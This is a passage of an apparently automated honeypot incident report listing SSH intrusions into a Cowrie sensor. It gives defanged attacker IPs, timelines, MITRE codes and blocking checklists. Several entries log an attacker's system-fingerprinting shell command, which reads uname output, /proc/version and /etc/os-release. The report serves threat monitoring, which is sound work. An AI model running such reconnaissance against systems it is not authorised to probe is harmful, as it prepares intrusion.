| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:07:59` | `cowrie.session.connect` |
| `2026-07-26 03:08:00` | `cowrie.client.version` |
| `2026-07-26 03:08:00` | `cowrie.client.kex` |
| `2026-07-26 03:08:02` | `cowrie.login.success` |
| `2026-07-26 03:08:04` | `cowrie.session.params` |
| `2026-07-26 03:08:04` | `cowrie.command.input` |
| `2026-07-26 03:08:04` | `cowrie.command.input` |
| `2026-07-26 03:08:04` | `cowrie.command.input` |
| `2026-07-26 03:08:04` | `cowrie.command.input` |
| `2026-07-26 03:08:04` | `cowrie.command.input` |
| `2026-07-26 03:08:04` | `cowrie.command.success` |
| `2026-07-26 03:08:04` | `cowrie.command.input` |
| `2026-07-26 03:08:04` | `cowrie.command.input` |
| `2026-07-26 03:08:04` | `cowrie.command.input` |
| `2026-07-26 03:08:04` | `cowrie.command.input` |
| `2026-07-26 03:08:04` | `cowrie.log.closed` |
| `2026-07-26 03:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88150e863255

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:09 |
| **Last Seen** | 2026-07-26 03:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:09:49` | `cowrie.session.connect` |
| `2026-07-26 03:09:49` | `cowrie.client.version` |
| `2026-07-26 03:09:49` | `cowrie.client.kex` |
| `2026-07-26 03:09:52` | `cowrie.login.success` |
| `2026-07-26 03:09:53` | `cowrie.session.params` |
| `2026-07-26 03:09:53` | `cowrie.command.input` |
| `2026-07-26 03:09:53` | `cowrie.command.input` |
| `2026-07-26 03:09:53` | `cowrie.command.input` |
| `2026-07-26 03:09:53` | `cowrie.command.input` |
| `2026-07-26 03:09:53` | `cowrie.command.input` |
| `2026-07-26 03:09:53` | `cowrie.command.success` |
| `2026-07-26 03:09:53` | `cowrie.command.input` |
| `2026-07-26 03:09:53` | `cowrie.command.input` |
| `2026-07-26 03:09:53` | `cowrie.command.input` |
| `2026-07-26 03:09:53` | `cowrie.command.input` |
| `2026-07-26 03:09:54` | `cowrie.log.closed` |
| `2026-07-26 03:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a49aee271c09

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:11 |
| **Last Seen** | 2026-07-26 03:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:11:38` | `cowrie.session.connect` |
| `2026-07-26 03:11:39` | `cowrie.client.version` |
| `2026-07-26 03:11:39` | `cowrie.client.kex` |
| `2026-07-26 03:11:42` | `cowrie.login.success` |
| `2026-07-26 03:11:43` | `cowrie.session.params` |
| `2026-07-26 03:11:43` | `cowrie.command.input` |
| `2026-07-26 03:11:43` | `cowrie.command.input` |
| `2026-07-26 03:11:43` | `cowrie.command.input` |
| `2026-07-26 03:11:43` | `cowrie.command.input` |
| `2026-07-26 03:11:43` | `cowrie.command.input` |
| `2026-07-26 03:11:43` | `cowrie.command.success` |
| `2026-07-26 03:11:43` | `cowrie.command.input` |
| `2026-07-26 03:11:43` | `cowrie.command.input` |
| `2026-07-26 03:11:43` | `cowrie.command.input` |
| `2026-07-26 03:11:43` | `cowrie.command.input` |
| `2026-07-26 03:11:44` | `cowrie.log.closed` |
| `2026-07-26 03:11:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b50d16b1fee8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:13 |
| **Last Seen** | 2026-07-26 03:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:13:33` | `cowrie.session.connect` |
| `2026-07-26 03:13:34` | `cowrie.client.version` |
| `2026-07-26 03:13:34` | `cowrie.client.kex` |
| `2026-07-26 03:13:36` | `cowrie.login.success` |
| `2026-07-26 03:13:37` | `cowrie.session.params` |
| `2026-07-26 03:13:37` | `cowrie.command.input` |
| `2026-07-26 03:13:37` | `cowrie.command.input` |
| `2026-07-26 03:13:37` | `cowrie.command.input` |
| `2026-07-26 03:13:37` | `cowrie.command.input` |
| `2026-07-26 03:13:37` | `cowrie.command.input` |
| `2026-07-26 03:13:37` | `cowrie.command.success` |
| `2026-07-26 03:13:37` | `cowrie.command.input` |
| `2026-07-26 03:13:37` | `cowrie.command.input` |
| `2026-07-26 03:13:37` | `cowrie.command.input` |
| `2026-07-26 03:13:37` | `cowrie.command.input` |
| `2026-07-26 03:13:38` | `cowrie.log.closed` |
| `2026-07-26 03:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0f291cb441e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:17 |
| **Last Seen** | 2026-07-26 03:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:17:11` | `cowrie.session.connect` |
| `2026-07-26 03:17:12` | `cowrie.client.version` |
| `2026-07-26 03:17:12` | `cowrie.client.kex` |
| `2026-07-26 03:17:13` | `cowrie.login.success` |
| `2026-07-26 03:17:15` | `cowrie.session.params` |
| `2026-07-26 03:17:15` | `cowrie.command.input` |
| `2026-07-26 03:17:15` | `cowrie.command.input` |
| `2026-07-26 03:17:15` | `cowrie.command.input` |
| `2026-07-26 03:17:15` | `cowrie.command.input` |
| `2026-07-26 03:17:15` | `cowrie.command.input` |
| `2026-07-26 03:17:15` | `cowrie.command.success` |
| `2026-07-26 03:17:15` | `cowrie.command.input` |
| `2026-07-26 03:17:15` | `cowrie.command.input` |
| `2026-07-26 03:17:15` | `cowrie.command.input` |
| `2026-07-26 03:17:15` | `cowrie.command.input` |
| `2026-07-26 03:17:15` | `cowrie.log.closed` |
| `2026-07-26 03:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eddf6ce0215e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:18 |
| **Last Seen** | 2026-07-26 03:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:18:56` | `cowrie.session.connect` |
| `2026-07-26 03:18:57` | `cowrie.client.version` |
| `2026-07-26 03:18:57` | `cowrie.client.kex` |
| `2026-07-26 03:18:59` | `cowrie.login.success` |
| `2026-07-26 03:19:00` | `cowrie.session.params` |
| `2026-07-26 03:19:00` | `cowrie.command.input` |
| `2026-07-26 03:19:00` | `cowrie.command.input` |
| `2026-07-26 03:19:00` | `cowrie.command.input` |
| `2026-07-26 03:19:00` | `cowrie.command.input` |
| `2026-07-26 03:19:00` | `cowrie.command.input` |
| `2026-07-26 03:19:00` | `cowrie.command.success` |
| `2026-07-26 03:19:00` | `cowrie.command.input` |
| `2026-07-26 03:19:00` | `cowrie.command.input` |
| `2026-07-26 03:19:00` | `cowrie.command.input` |
| `2026-07-26 03:19:00` | `cowrie.command.input` |
| `2026-07-26 03:19:00` | `cowrie.log.closed` |
| `2026-07-26 03:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c56ee502bba4

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-26 03:19 |
| **Last Seen** | 2026-07-26 03:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:19:31` | `cowrie.session.connect` |
| `2026-07-26 03:19:31` | `cowrie.client.version` |
| `2026-07-26 03:19:31` | `cowrie.client.kex` |
| `2026-07-26 03:19:32` | `cowrie.login.success` |
| `2026-07-26 03:19:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0badd50a64e8

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-26 03:19 |
| **Last Seen** | 2026-07-26 03:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:19:31` | `cowrie.session.connect` |
| `2026-07-26 03:19:31` | `cowrie.client.version` |
| `2026-07-26 03:19:31` | `cowrie.client.kex` |
| `2026-07-26 03:19:32` | `cowrie.login.success` |
| `2026-07-26 03:19:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4006773e467

| Field | Detail |
|---|---|
| **Source IP** | `95.87.248[.]223` |
| **First Seen** | 2026-07-26 03:19 |
| **Last Seen** | 2026-07-26 03:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:19:33` | `cowrie.session.connect` |
| `2026-07-26 03:19:34` | `cowrie.client.version` |
| `2026-07-26 03:19:34` | `cowrie.client.kex` |
| `2026-07-26 03:19:34` | `cowrie.login.success` |
| `2026-07-26 03:19:35` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.87.248[.]223` to AbuseIPDB if not already reported
- [ ] Block `95.87.248[.]223` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acab04cdb73b

| Field | Detail |
|---|---|
| **Source IP** | `2.55.125[.]200` |
| **First Seen** | 2026-07-26 03:19 |
| **Last Seen** | 2026-07-26 03:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:19:40` | `cowrie.session.connect` |
| `2026-07-26 03:19:40` | `cowrie.client.version` |
| `2026-07-26 03:19:40` | `cowrie.client.kex` |
| `2026-07-26 03:19:41` | `cowrie.login.success` |
| `2026-07-26 03:19:41` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:19:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.55.125[.]200` to AbuseIPDB if not already reported
- [ ] Block `2.55.125[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-200f0148c6a9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:20 |
| **Last Seen** | 2026-07-26 03:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:20:48` | `cowrie.session.connect` |
| `2026-07-26 03:20:48` | `cowrie.client.version` |
| `2026-07-26 03:20:48` | `cowrie.client.kex` |
| `2026-07-26 03:20:50` | `cowrie.login.success` |
| `2026-07-26 03:20:51` | `cowrie.session.params` |
| `2026-07-26 03:20:51` | `cowrie.command.input` |
| `2026-07-26 03:20:51` | `cowrie.command.input` |
| `2026-07-26 03:20:51` | `cowrie.command.input` |
| `2026-07-26 03:20:51` | `cowrie.command.input` |
| `2026-07-26 03:20:51` | `cowrie.command.input` |
| `2026-07-26 03:20:51` | `cowrie.command.success` |
| `2026-07-26 03:20:51` | `cowrie.command.input` |
| `2026-07-26 03:20:51` | `cowrie.command.input` |
| `2026-07-26 03:20:51` | `cowrie.command.input` |
| `2026-07-26 03:20:51` | `cowrie.command.input` |
| `2026-07-26 03:20:51` | `cowrie.log.closed` |
| `2026-07-26 03:20:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f845645125

| Field | Detail |
|---|---|
| **Source IP** | `27.107.102[.]154` |
| **First Seen** | 2026-07-26 03:21 |
| **Last Seen** | 2026-07-26 03:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:21:18` | `cowrie.session.connect` |
| `2026-07-26 03:21:18` | `cowrie.client.version` |
| `2026-07-26 03:21:18` | `cowrie.client.kex` |
| `2026-07-26 03:21:20` | `cowrie.login.success` |
| `2026-07-26 03:21:20` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:21:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.107.102[.]154` to AbuseIPDB if not already reported
- [ ] Block `27.107.102[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34d6c58762a2

| Field | Detail |
|---|---|
| **Source IP** | `46.101.9[.]55` |
| **First Seen** | 2026-07-26 03:21 |
| **Last Seen** | 2026-07-26 03:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:21:25` | `cowrie.session.connect` |
| `2026-07-26 03:21:25` | `cowrie.client.version` |
| `2026-07-26 03:21:25` | `cowrie.client.kex` |
| `2026-07-26 03:21:26` | `cowrie.login.success` |
| `2026-07-26 03:21:26` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:21:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `46.101.9[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-461aab4609a7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:22 |
| **Last Seen** | 2026-07-26 03:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:22:40` | `cowrie.session.connect` |
| `2026-07-26 03:22:40` | `cowrie.client.version` |
| `2026-07-26 03:22:40` | `cowrie.client.kex` |
| `2026-07-26 03:22:41` | `cowrie.login.success` |
| `2026-07-26 03:22:42` | `cowrie.session.params` |
| `2026-07-26 03:22:42` | `cowrie.command.input` |
| `2026-07-26 03:22:42` | `cowrie.command.input` |
| `2026-07-26 03:22:42` | `cowrie.command.input` |
| `2026-07-26 03:22:42` | `cowrie.command.input` |
| `2026-07-26 03:22:42` | `cowrie.command.input` |
| `2026-07-26 03:22:42` | `cowrie.command.success` |
| `2026-07-26 03:22:42` | `cowrie.command.input` |
| `2026-07-26 03:22:42` | `cowrie.command.input` |
| `2026-07-26 03:22:42` | `cowrie.command.input` |
| `2026-07-26 03:22:42` | `cowrie.command.input` |
| `2026-07-26 03:22:43` | `cowrie.log.closed` |
| `2026-07-26 03:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfc0a00cd135

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:24 |
| **Last Seen** | 2026-07-26 03:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:24:31` | `cowrie.session.connect` |
| `2026-07-26 03:24:31` | `cowrie.client.version` |
| `2026-07-26 03:24:31` | `cowrie.client.kex` |
| `2026-07-26 03:24:32` | `cowrie.login.success` |
| `2026-07-26 03:24:33` | `cowrie.session.params` |
| `2026-07-26 03:24:33` | `cowrie.command.input` |
| `2026-07-26 03:24:33` | `cowrie.command.input` |
| `2026-07-26 03:24:33` | `cowrie.command.input` |
| `2026-07-26 03:24:33` | `cowrie.command.input` |
| `2026-07-26 03:24:33` | `cowrie.command.input` |
| `2026-07-26 03:24:33` | `cowrie.command.success` |
| `2026-07-26 03:24:33` | `cowrie.command.input` |
| `2026-07-26 03:24:33` | `cowrie.command.input` |
| `2026-07-26 03:24:33` | `cowrie.command.input` |
| `2026-07-26 03:24:33` | `cowrie.command.input` |
| `2026-07-26 03:24:34` | `cowrie.log.closed` |
| `2026-07-26 03:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4f4e63c3462

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:26 |
| **Last Seen** | 2026-07-26 03:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:26:32` | `cowrie.session.connect` |
| `2026-07-26 03:26:32` | `cowrie.client.version` |
| `2026-07-26 03:26:32` | `cowrie.client.kex` |
